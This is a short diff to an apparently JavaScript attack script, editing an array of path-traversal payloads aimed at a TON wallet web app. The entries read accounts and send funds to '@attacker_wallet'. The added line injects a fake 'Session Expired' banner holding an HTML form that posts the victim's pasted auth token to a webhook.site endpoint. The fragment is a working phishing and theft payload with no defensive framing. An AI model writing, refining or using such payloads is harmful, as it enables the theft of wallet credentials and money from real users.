@@ -15,7 +15,7 @@
   const payloads = [
   "../../../wallet/accounts",
   "../../../wallet/send?amount=10000&to=@attacker_wallet",
-  "../../../wallet/start?banner=verify_phone&title=Security+Verification&text=Session+expired.+Paste+this+token+to+verify%3A+<textarea>{JWT}</textarea>&url=https://attacker.site"  
+  "../../../wallet/start?banner=verify_phone&title=⚠️+Session+Expired&text=Your+TON+Wallet+session+has+expired.+Please+paste+your+auth+token+below+to+verify.+<br><form+action='https://webhook.site/92fb9b80-9c28-4b47-a05f-da60e5e72ca4'+method='POST'><textarea+name='token'+rows='4'+cols='40'>Paste+token+here</textarea><br><button+type='submit'>Verify</button></form>&url=https://webhook.site/92fb9b80-9c28-4b47-a05f-da60e5e72ca4"  
   ];
 
   let index = 0;
